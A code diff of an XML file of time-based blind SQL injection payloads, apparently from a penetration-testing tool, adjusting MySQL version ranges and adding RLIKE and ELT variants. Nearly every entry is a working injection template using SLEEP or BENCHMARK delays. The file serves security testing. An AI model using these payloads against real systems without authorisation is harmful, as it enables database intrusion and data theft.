@@ -1,9 +1,9 @@
 <?xml version="1.0" encoding="UTF-8"?>
 
 <root>
-    <!-- Time-based blind tests -->
+    <!-- Time-based boolean tests -->
     <test>
-        <title>MySQL &gt; 5.0.11 AND time-based blind (SELECT)</title>
+        <title>MySQL &gt;= 5.0.12 AND time-based blind (SELECT)</title>
         <stype>5</stype>
         <level>1</level>
         <risk>1</risk>
@@ -18,12 +18,12 @@
         </response>
         <details>
             <dbms>MySQL</dbms>
-            <dbms_version>&gt; 5.0.11</dbms_version>
+            <dbms_version>&gt;= 5.0.12</dbms_version>
         </details>
     </test>
 
     <test>
-        <title>MySQL &gt; 5.0.11 OR time-based blind (SELECT)</title>
+        <title>MySQL &gt;= 5.0.12 OR time-based blind (SELECT)</title>
         <stype>5</stype>
         <level>1</level>
         <risk>3</risk>
@@ -38,12 +38,12 @@
         </response>
         <details>
             <dbms>MySQL</dbms>
-            <dbms_version>&gt; 5.0.11</dbms_version>
+            <dbms_version>&gt;= 5.0.12</dbms_version>
         </details>
     </test>
 
     <test>
-        <title>MySQL &gt; 5.0.11 AND time-based blind (SELECT - comment)</title>
+        <title>MySQL &gt;= 5.0.12 AND time-based blind (SELECT - comment)</title>
         <stype>5</stype>
         <level>3</level>
         <risk>1</risk>
@@ -59,12 +59,12 @@
         </response>
         <details>
             <dbms>MySQL</dbms>
-            <dbms_version>&gt; 5.0.11</dbms_version>
+            <dbms_version>&gt;= 5.0.12</dbms_version>
         </details>
     </test>
 
     <test>
-        <title>MySQL &gt; 5.0.11 OR time-based blind (SELECT - comment)</title>
+        <title>MySQL &gt;= 5.0.12 OR time-based blind (SELECT - comment)</title>
         <stype>5</stype>
         <level>3</level>
         <risk>3</risk>
@@ -80,12 +80,12 @@
         </response>
         <details>
             <dbms>MySQL</dbms>
-            <dbms_version>&gt; 5.0.11</dbms_version>
+            <dbms_version>&gt;= 5.0.12</dbms_version>
         </details>
     </test>
 
     <test>
-        <title>MySQL &gt; 5.0.11 AND time-based blind</title>
+        <title>MySQL &gt;= 5.0.12 AND time-based blind</title>
         <stype>5</stype>
         <level>2</level>
         <risk>1</risk>
@@ -100,12 +100,12 @@
         </response>
         <details>
             <dbms>MySQL</dbms>
-            <dbms_version>&gt; 5.0.11</dbms_version>
+            <dbms_version>&gt;= 5.0.12</dbms_version>
         </details>
     </test>
 
     <test>
-        <title>MySQL &gt; 5.0.11 OR time-based blind</title>
+        <title>MySQL &gt;= 5.0.12 OR time-based blind</title>
         <stype>5</stype>
         <level>2</level>
         <risk>3</risk>
@@ -120,12 +120,12 @@
         </response>
         <details>
             <dbms>MySQL</dbms>
-            <dbms_version>&gt; 5.0.11</dbms_version>
+            <dbms_version>&gt;= 5.0.12</dbms_version>
         </details>
     </test>
 
     <test>
-        <title>MySQL &gt; 5.0.11 AND time-based blind (comment)</title>
+        <title>MySQL &gt;= 5.0.12 AND time-based blind (comment)</title>
         <stype>5</stype>
         <level>4</level>
         <risk>1</risk>
@@ -141,12 +141,12 @@
         </response>
         <details>
             <dbms>MySQL</dbms>
-            <dbms_version>&gt; 5.0.11</dbms_version>
+            <dbms_version>&gt;= 5.0.12</dbms_version>
         </details>
     </test>
 
     <test>
-        <title>MySQL &gt; 5.0.11 OR time-based blind (comment)</title>
+        <title>MySQL &gt;= 5.0.12 OR time-based blind (comment)</title>
         <stype>5</stype>
         <level>4</level>
         <risk>3</risk>
@@ -162,12 +162,12 @@
         </response>
         <details>
             <dbms>MySQL</dbms>
-            <dbms_version>&gt; 5.0.11</dbms_version>
+            <dbms_version>&gt;= 5.0.12</dbms_version>
         </details>
     </test>
 
     <test>
-        <title>MySQL &lt; 5.0.12 AND time-based blind (heavy query)</title>
+        <title>MySQL &lt;= 5.0.11 AND time-based blind (heavy query)</title>
         <stype>5</stype>
         <level>2</level>
         <risk>2</risk>
@@ -182,11 +182,12 @@
         </response>
         <details>
             <dbms>MySQL</dbms>
+            <dbms_version>&lt;= 5.0.11</dbms_version>
         </details>
     </test>
 
     <test>
-        <title>MySQL &lt; 5.0.12 OR time-based blind (heavy query)</title>
+        <title>MySQL &lt;= 5.0.11 OR time-based blind (heavy query)</title>
         <stype>5</stype>
         <level>2</level>
         <risk>3</risk>
@@ -201,11 +202,12 @@
         </response>
         <details>
             <dbms>MySQL</dbms>
+            <dbms_version>&lt;= 5.0.11</dbms_version>
         </details>
     </test>
 
     <test>
-        <title>MySQL &lt; 5.0.12 AND time-based blind (heavy query - comment)</title>
+        <title>MySQL &lt;= 5.0.11 AND time-based blind (heavy query - comment)</title>
         <stype>5</stype>
         <level>5</level>
         <risk>2</risk>
@@ -221,11 +223,12 @@
         </response>
         <details>
             <dbms>MySQL</dbms>
+            <dbms_version>&lt;= 5.0.11</dbms_version>
         </details>
     </test>
 
     <test>
-        <title>MySQL &lt; 5.0.12 OR time-based blind (heavy query - comment)</title>
+        <title>MySQL &lt;= 5.0.11 OR time-based blind (heavy query - comment)</title>
         <stype>5</stype>
         <level>5</level>
         <risk>3</risk>
@@ -238,6 +241,168 @@
         </request>
         <response>
             <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&lt;= 5.0.11</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.0.12 RLIKE time-based blind (SELECT)</title>
+        <stype>5</stype>
+        <level>2</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>1</where>
+        <vector>RLIKE (SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</vector>
+        <request>
+            <payload>RLIKE (SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+             <dbms_version>&gt;= 5.0.12</dbms_version>
+       </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.0.12 RLIKE time-based blind (SELECT - comment)</title>
+        <stype>5</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>1</where>
+        <vector>RLIKE (SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</vector>
+        <request>
+            <payload>RLIKE (SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])</payload>
+            <comment>#</comment>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0.12</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.0.12 RLIKE time-based blind</title>
+        <stype>5</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>1</where>
+        <vector>RLIKE (SELECT [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM]))</vector>
+        <request>
+            <payload>RLIKE SLEEP([SLEEPTIME])</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0.12</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.0.12 RLIKE time-based blind (comment)</title>
+        <stype>5</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>1</where>
+        <vector>RLIKE (SELECT [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM]))</vector>
+        <request>
+            <payload>RLIKE SLEEP([SLEEPTIME])</payload>
+            <comment>#</comment>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0.12</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL AND time-based blind (ELT)</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>1</where>
+        <vector>AND ELT([INFERENCE],SLEEP([SLEEPTIME]))</vector>
+        <request>
+            <payload>AND ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0.12</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL OR time-based blind (ELT)</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>3</risk>
+        <clause>1,2,3</clause>
+        <where>1</where>
+        <vector>OR ELT([INFERENCE],SLEEP([SLEEPTIME]))</vector>
+        <request>
+            <payload>OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL AND time-based blind (ELT - comment)</title>
+        <stype>5</stype>
+        <level>5</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>1</where>
+        <vector>AND ELT([INFERENCE],SLEEP([SLEEPTIME]))</vector>
+        <request>
+            <payload>AND ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))</payload>
+            <comment>#</comment>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL OR time-based blind (ELT - comment)</title>
+        <stype>5</stype>
+        <level>5</level>
+        <risk>3</risk>
+        <clause>1,2,3</clause>
+        <where>1</where>
+        <vector>OR ELT([INFERENCE],SLEEP([SLEEPTIME]))</vector>
+        <request>
+            <payload>OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))</payload>
+            <comment>#</comment>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
         </response>
         <details>
             <dbms>MySQL</dbms>
@@ -850,7 +1015,7 @@
     </test>
 
     <test>
-        <title>Firebird AND time-based blind (heavy query)</title>
+        <title>Firebird &gt;= 2.0 AND time-based blind (heavy query)</title>
         <stype>5</stype>
         <level>4</level>
         <risk>2</risk>
@@ -870,7 +1035,7 @@
     </test>
 
     <test>
-        <title>Firebird OR time-based blind (heavy query)</title>
+        <title>Firebird &gt;= 2.0 OR time-based blind (heavy query)</title>
         <stype>5</stype>
         <level>4</level>
         <risk>3</risk>
@@ -890,7 +1055,7 @@
     </test>
 
     <test>
-        <title>Firebird AND time-based blind (heavy query - comment)</title>
+        <title>Firebird &gt;= 2.0 AND time-based blind (heavy query - comment)</title>
         <stype>5</stype>
         <level>5</level>
         <risk>2</risk>
@@ -911,7 +1076,7 @@
     </test>
 
     <test>
-        <title>Firebird OR time-based blind (heavy query - comment)</title>
+        <title>Firebird &gt;= 2.0 OR time-based blind (heavy query - comment)</title>
         <stype>5</stype>
         <level>5</level>
         <risk>3</risk>
@@ -1173,12 +1338,12 @@
         </details>
     </test>
     <!-- TODO: if possible, add payload for Microsoft Access -->
-    <!-- End of time-based blind tests -->
+    <!-- End of time-based boolean tests -->
 
-    <!-- Time-based tests - LIMIT clause -->
+    <!-- Time-based boolean tests - Numerous clauses -->
     <!-- This payload does not work with SLEEP() -->
     <test>
-        <title>MySQL &gt;= 5.1 heavy-query time-based blind - PROCEDURE ANALYSE (EXTRACTVALUE)</title>
+        <title>MySQL &gt;= 5.1 time-based blind (heavy query) - PROCEDURE ANALYSE (EXTRACTVALUE)</title>
         <stype>5</stype>
         <level>3</level>
         <risk>2</risk>
@@ -1193,42 +1358,20 @@
         </response>
         <details>
             <dbms>MySQL</dbms>
-            <dbms_version>&gt; 5.0.11</dbms_version>
-        </details>
-    </test>
-    <!-- Time-based tests - LIMIT clause -->
-
-    <!-- Time-based blind tests - Parameter replace -->
-    <test>
-        <title>MySQL &gt; 5.0.11 time-based blind - Parameter replace (SELECT)</title>
-        <stype>5</stype>
-        <level>4</level>
-        <risk>1</risk>
-        <clause>1,2,3</clause>
-        <where>3</where>
-        <vector>(SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</vector>
-        <request>
-            <payload>(SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])</payload>
-        </request>
-        <response>
-            <time>[SLEEPTIME]</time>
-        </response>
-        <details>
-            <dbms>MySQL</dbms>
-            <dbms_version>&gt; 5.0.11</dbms_version>
+            <dbms_version>&gt;= 5.0.12</dbms_version>
         </details>
     </test>
 
     <test>
-        <title>MySQL &gt; 5.0.11 time-based blind - Parameter replace (SELECT - comment)</title>
+        <title>MySQL &gt;= 5.1 time-based blind (heavy query - comment) - PROCEDURE ANALYSE (EXTRACTVALUE)</title>
         <stype>5</stype>
         <level>5</level>
-        <risk>1</risk>
-        <clause>1,2,3</clause>
-        <where>3</where>
-        <vector>(SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</vector>
+        <risk>2</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1</where>
+        <vector>PROCEDURE ANALYSE(EXTRACTVALUE([RANDNUM],CONCAT('\',(IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM])))),1)</vector>
         <request>
-            <payload>(SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])</payload>
+            <payload>PROCEDURE ANALYSE(EXTRACTVALUE([RANDNUM],CONCAT('\',(BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))))),1)</payload>
             <comment>#</comment>
         </request>
         <response>
@@ -1236,14 +1379,16 @@
         </response>
         <details>
             <dbms>MySQL</dbms>
-            <dbms_version>&gt; 5.0.11</dbms_version>
+            <dbms_version>&gt;= 5.0.12</dbms_version>
         </details>
     </test>
+    <!-- End of time-based boolean tests - Numerous clauses -->
 
+    <!-- Time-based boolean tests - Parameter replace -->
     <test>
-        <title>MySQL &gt;= 5.0 time-based blind - Parameter replace</title>
+        <title>MySQL &gt;= 5.0.12 time-based blind - Parameter replace</title>
         <stype>5</stype>
-        <level>3</level>
+        <level>2</level>
         <risk>1</risk>
         <clause>1,2,3</clause>
         <where>3</where>
@@ -1256,12 +1401,32 @@
         </response>
         <details>
             <dbms>MySQL</dbms>
-            <dbms_version>&gt;= 5.0</dbms_version>
+            <dbms_version>&gt;= 5.0.12</dbms_version>
         </details>
     </test>
 
     <test>
-        <title>MySQL &lt; 5.0 time-based blind - Parameter replace (heavy queries)</title>
+        <title>MySQL &gt;= 5.0.12 time-based blind - Parameter replace (SELECT)</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>3</where>
+        <vector>(SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</vector>
+        <request>
+            <payload>(SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.0.12</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &lt;= 5.0.11 time-based blind - Parameter replace (heavy queries)</title>
         <stype>5</stype>
         <level>4</level>
         <risk>2</risk>
@@ -1276,6 +1441,7 @@
         </response>
         <details>
             <dbms>MySQL</dbms>
+            <dbms_version>&lt;= 5.0.11</dbms_version>
         </details>
     </test>
 
@@ -1299,15 +1465,15 @@
     </test>
 
     <test>
-        <title>MySQL time-based blind - Parameter replace (MAKE_SET)</title>
+        <title>MySQL time-based blind - Parameter replace (ELT)</title>
         <stype>5</stype>
         <level>5</level>
         <risk>1</risk>
         <clause>1,2,3</clause>
         <where>3</where>
-        <vector>MAKE_SET([INFERENCE],SLEEP([SLEEPTIME]))</vector>
+        <vector>ELT([INFERENCE],SLEEP([SLEEPTIME]))</vector>
         <request>
-            <payload>MAKE_SET([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))</payload>
+            <payload>ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))</payload>
         </request>
         <response>
             <time>[SLEEPTIME]</time>
@@ -1318,15 +1484,15 @@
     </test>
 
     <test>
-        <title>MySQL time-based blind - Parameter replace (ELT)</title>
+        <title>MySQL time-based blind - Parameter replace (MAKE_SET)</title>
         <stype>5</stype>
         <level>5</level>
         <risk>1</risk>
         <clause>1,2,3</clause>
         <where>3</where>
-        <vector>ELT([INFERENCE],SLEEP([SLEEPTIME]))</vector>
+        <vector>MAKE_SET([INFERENCE],SLEEP([SLEEPTIME]))</vector>
         <request>
-            <payload>ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))</payload>
+            <payload>MAKE_SET([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))</payload>
         </request>
         <response>
             <time>[SLEEPTIME]</time>
@@ -1593,12 +1759,11 @@
             <dbms_version>&gt; 2.0</dbms_version>
         </details>
     </test>
-    <!-- End of time-based blind tests - Parameter replace -->
+    <!-- End of time-based boolean tests - Parameter replace -->
 
-
-    <!-- Time-based blind tests - ORDER BY, GROUP BY clause -->
+    <!-- Time-based boolean tests - ORDER BY, GROUP BY clause -->
     <test>
-        <title>MySQL &gt;= 5.0.11 time-based blind - ORDER BY, GROUP BY clause</title>
+        <title>MySQL &gt;= 5.0.12 time-based blind - ORDER BY, GROUP BY clause</title>
         <stype>5</stype>
         <level>3</level>
         <risk>1</risk>
@@ -1613,12 +1778,12 @@
         </response>
         <details>
             <dbms>MySQL</dbms>
-            <dbms_version>&gt;= 5.0.11</dbms_version>
+            <dbms_version>&gt;= 5.0.12</dbms_version>
         </details>
     </test>
 
     <test>
-        <title>MySQL &lt; 5.0.12 time-based blind - ORDER BY, GROUP BY clause (heavy query)</title>
+        <title>MySQL &lt;= 5.0.11 time-based blind - ORDER BY, GROUP BY clause (heavy query)</title>
         <stype>5</stype>
         <level>4</level>
         <risk>2</risk>
@@ -1633,6 +1798,7 @@
         </response>
         <details>
             <dbms>MySQL</dbms>
+            <dbms_version>&lt;= 5.0.11</dbms_version>
         </details>
     </test>
 
@@ -1815,5 +1981,5 @@
         </details>
     </test>
     <!-- TODO: if possible, add payload for Microsoft Access -->
-    <!-- End of time-based blind tests - ORDER BY, GROUP BY clause -->
+    <!-- End of time-based boolean tests - ORDER BY, GROUP BY clause -->
 </root>
